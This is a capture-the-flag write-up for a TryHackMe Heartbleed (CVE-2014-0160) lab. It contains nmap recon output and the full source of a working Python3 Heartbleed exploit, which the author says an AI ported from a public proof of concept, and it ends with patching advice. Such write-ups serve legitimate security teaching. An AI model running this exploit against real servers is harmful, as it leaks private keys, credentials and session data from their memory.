# HEARTBLEED SSL — Write-up

## Objective

In this task, the goal is to obtain a flag using a very well-known vulnerability. Pay attention to all the information and errors displayed, and pay particular attention to how web servers are configured.

> **Note:** The server may take 3-4 minutes to deploy and configure. Please be patient.

**Questions to answer:**

- What is the flag?

---

## Initial Recon

```bash
nmap -sS -sV -sC 10.80.84.216
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
111/tcp open  rpcbind  2-4 (RPC #100000)
443/tcp open  ssl/http nginx 1.15.7
| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Not valid before: 2019-02-16T10:41:14
|_Not valid after:  2020-02-16T10:41:14
|_http-title: What are you looking for?
|_http-server-header: nginx/1.15.7
```

Obviously since this is a SSL challenge and the only port with a SSL cert is port 443, I decided to run a specific Heartbleed scanner using Nmap and found it was vulnerable (obvious).

```bash
nmap --script ssl-heartbleed -p 443 10.80.84.216
```

```
PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt
```

It gave me the correct CVE, **CVE-2014-0160**.

---

## Exploiting Heartbleed

I found a Python script corresponding to the CVE: `https://www.exploit-db.com/exploits/32791`. It was only compatible with Python2, so I asked an AI to change it to a script that works with Python3:

```python
import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.' ) for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
    print()

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            hexdump(pay)
            if len(pay) > 3:
                print('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print('Received alert:')
            hexdump(pay)
            print('Server returned error, likely not vulnerable')
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting...')
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print('Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)
    print('Waiting for Server Hello...')
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print('Server closed connection without sending Server Hello.')
            return
        # Look for server hello done message.
        if typ == 22 and pay[0] == 0x0E:
            break

    print('Sending heartbeat request...')
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)

if __name__ == '__main__':
    main()
```

From this I received the flag.

**Flag:** `THM{sSl-##-BaD}`

---

## Summary

- **Recon:** Nmap showed SSH, rpcbind, and an nginx HTTPS service on port 443 — the only port presenting an SSL certificate, and therefore the obvious target for an "SSL challenge."
- **Vulnerability confirmation:** Running Nmap's `ssl-heartbleed` script confirmed the server was vulnerable to **CVE-2014-0160** (Heartbleed) — a flaw in OpenSSL's heartbeat extension that lets an attacker read arbitrary chunks of server memory over an encrypted connection.
- **Exploitation:** A public Python2 PoC for the CVE was ported to Python3 and used to send a malformed heartbeat request. The oversized response leaked memory contents from the server, which contained the flag.

**Key takeaways:**

- Heartbleed is a textbook example of why a memory-safety bug in a widely-used crypto library (OpenSSL) can be catastrophic — it lets an attacker read raw process memory (potentially private keys, session data, or credentials) with just a crafted TLS heartbeat, no authentication required.
- Any service still running an OpenSSL version in the 1.0.1–1.0.2-beta range is exposed; patching or upgrading OpenSSL (and reissuing certificates/keys afterward, since they may have leaked) is the actual fix — not just restarting the service.
- Old public PoCs are often written for Python2; porting them to Python3 is usually a mechanical exercise (mostly bytes/str handling) rather than needing a new exploit approach.
